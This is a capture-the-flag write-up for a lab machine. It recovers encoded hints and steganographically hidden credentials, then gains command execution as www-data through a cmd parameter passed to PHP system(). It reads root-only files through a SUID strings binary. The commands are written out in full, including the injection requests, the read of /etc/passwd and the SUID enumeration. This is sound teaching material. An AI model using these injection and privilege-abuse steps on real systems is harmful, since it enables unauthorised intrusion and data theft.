---
type: writeup
platform: Exegol
room: Le Meffert
os: Linux
environment: Web Application / Linux Privilege Escalation

techniques:
  - information-disclosure
  - data-decoding
  - steganography
  - credential-discovery
  - command-injection
  - remote-code-execution
  - suid-enumeration
  - suid-abuse
  - arbitrary-file-read

tools:
  - nmap
  - curl
  - wget
  - base64
  - base32
  - xxd
  - exiftool
  - strings
  - steghide
  - find
---
**Attack path:** HTML disclosure → encoded recovery hints → steganographic credentials → authenticated secret page → OS command injection as `www-data` → SUID `strings` → privileged file read

## 1. Reconnaissance

A full TCP scan was performed:

```bash
nmap -sC -sV -p- --min-rate 5000 <TARGET_IP>
```

Two services were exposed on unusual ports:

```bash
22/tcp open  http  Apache httpd
80/tcp open  ssh   OpenSSH
```

The service mapping was therefore the reverse of the conventional expectation:

```text
HTTP → TCP/22
SSH  → TCP/80
```

The web application was accessible at:

```bash
http://<TARGET_IP>:22
```

This is a useful reminder that service identification should rely on observed protocol behavior rather than port-number assumptions.

---

## 2. HTML Information Disclosure

Inspection of the home page source revealed two useful HTML comments.

One referenced:

```bash
/recovery.php
```

The other contained Base64-encoded data.

It was decoded with:

```bash
echo '<BASE64_DATA>' | base64 -d
```

The decoded message disclosed a backup passphrase.

Public version:

```bash
Backup passphrase: <REDACTED>
```

Base64 provided only encoding, not protection: anyone with access to the page source could recover the underlying value.

The newly discovered `/recovery.php` endpoint was investigated next.

---

## 3. Recovery Page and Layered Encoding

The recovery page was requested directly:

```bash
curl -i http://<TARGET_IP>:22/recovery.php
```

Its HTML contained another encoded value.

The preserved decoding chain was:

```bash
echo '<ENCODED_DATA>' \
  | base64 -d \
  | base32 -d \
  | xxd -r -p
```

The resulting message was:

```bash
You forgot again didnt you? remember: the cubes are the keys to everything
```

This provided a concrete next step: investigate the application's cube images.

---

## 4. Cube Image Analysis

The relevant images were downloaded:

```bash
wget -q \
  http://<TARGET_IP>:22/assets/{cube_barrel.jpg,cube_ghost.jpg,cube_gold.jpg,cube_max.jpg,cube_void.jpg}
```

Initial inspection used:

```bash
exiftool cube_*.jpg
strings cube_*.jpg
```

Neither approach exposed useful plaintext.

Because the previous hint explicitly pointed toward the cubes and a passphrase had already been recovered, the images were then tested for embedded steganographic content:

```bash
for f in cube_*.jpg; do
    echo "=== $f ==="
    steghide info "$f" -p '<REDACTED>'
done
```

`cube_gold.jpg` reported an embedded file:

```bash
embedded file "passwd"
encrypted: rijndael-128, cbc
compressed: yes
```

The file was extracted:

```bash
steghide extract \
  -sf cube_gold.jpg \
  -p '<REDACTED>'
```

Its contents were inspected:

```bash
cat passwd
```

and revealed web credentials:

```bash
Username: uweThePuzzleMaster
Password: <REDACTED>
```

The attack had now progressed from public information disclosure to a valid application credential.

---

## 5. Authentication to the Recovery Application

The recovered credentials were submitted to `recovery.php` while preserving the resulting session:

```bash
curl -i -L \
  -c cookies.txt \
  -b cookies.txt \
  --data-urlencode 'user=uweThePuzzleMaster' \
  --data-urlencode 'pass=<REDACTED>' \
  http://<TARGET_IP>:22/recovery.php
```

Authentication succeeded and redirected to:

```bash
/my_very_secret_dir/index.php
```

The page displayed:

```bash
GET me a cmd and we'll talk!
```

The message strongly suggested a GET parameter named:

```bash
cmd
```

Rather than assuming exploitation was possible, a minimal command was used to test the hypothesis.

---

## 6. OS Command Injection

The `cmd` parameter was tested with:

```bash
curl -G \
  -b cookies.txt \
  --data-urlencode 'cmd=id' \
  http://<TARGET_IP>:22/my_very_secret_dir/index.php
```

Result:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed arbitrary operating-system command execution as:

```bash
www-data
```

Additional enumeration could then be performed through the same primitive:

```bash
curl -G \
  -b cookies.txt \
  --data-urlencode 'cmd=whoami; pwd; ls -la' \
  http://<TARGET_IP>:22/my_very_secret_dir/index.php
```

The vulnerable PHP implementation was also accessible and showed the root cause directly:

```php
if (isset($_GET['cmd'])){
    system($_GET['cmd']);
}
```

User-controlled input was passed directly to `system()` without validation or isolation.

The vulnerability was therefore a direct **OS Command Injection**, providing RCE as `www-data`.

---

## 7. Local Enumeration

Local accounts were inspected:

```bash
cat /etc/passwd
```

A normal user account was identified:

```bash
uwe:x:1000:1000::/home/uwe:/bin/bash
```

The user's home directory existed at:

```bash
/home/uwe
```

but `www-data` could not directly read the protected user flag.

SUID files were therefore enumerated:

```bash
find / -perm -4000 -type f 2>/dev/null
```

An unusual result stood out:

```bash
/usr/bin/x86_64-linux-gnu-strings
```

Its permissions were inspected:

```bash
ls -l /usr/bin/x86_64-linux-gnu-strings
```

Result:

```bash
-rwsr-sr-x 1 root root ... /usr/bin/x86_64-linux-gnu-strings
```

The binary was owned by `root` and carried the SUID bit.

This made it worth testing against a file that `www-data` could not normally read.

---

## 8. SUID `strings` → User File Read

The protected user flag was passed directly to the SUID binary:

```bash
/usr/bin/x86_64-linux-gnu-strings /home/uwe/user.txt
```

Result:

```bash
EPI{REDACTED}
```

This confirmed that the misconfigured binary could read data inaccessible to the original `www-data` context.

The important primitive was therefore:

```text
www-data cannot read protected file
        +
root-owned strings is SUID
        +
strings accepts an arbitrary input path
        =
privileged file read
```

This was not merely an interesting SUID entry; its security impact had been directly demonstrated.

---

## 9. Root-Owned File Read

Because the same SUID binary accepted arbitrary paths, it was tested against:

```bash
/root/root.txt
```

Command:

```bash
/usr/bin/x86_64-linux-gnu-strings /root/root.txt
```

Result:

```bash
EPI{REDACTED}
```

The root-only flag was successfully read.

The demonstrated impact was therefore **arbitrary file read with the privileges provided by the root-owned SUID binary**.

The preserved evidence does not demonstrate an interactive root shell or arbitrary root command execution, so the result should not be described as a root shell compromise.

---

## Key Takeaways

- Service identification should follow protocol detection rather than conventional port assignments; HTTP was running on TCP/22 while SSH was on TCP/80.
- HTML comments can expose sensitive paths and secrets even when they are not visible in the rendered page.
- Base64, Base32 and hexadecimal transformations provide encoding, not confidentiality.
- An unsuccessful metadata or `strings` inspection can still narrow the investigation; here the explicit cube hint and recovered passphrase justified testing steganography next.
- Credentials hidden with steganography remain compromised when both the carrier file and the decryption passphrase are publicly reachable.
- Passing a GET parameter directly to PHP `system()` produces straightforward OS command injection.
- A SUID binary becomes exploitable when its privileged functionality can be applied to attacker-selected resources.
- Reading `/root/root.txt` through a SUID utility demonstrates privileged file access, but it should not be overstated as an interactive root shell or arbitrary root code execution.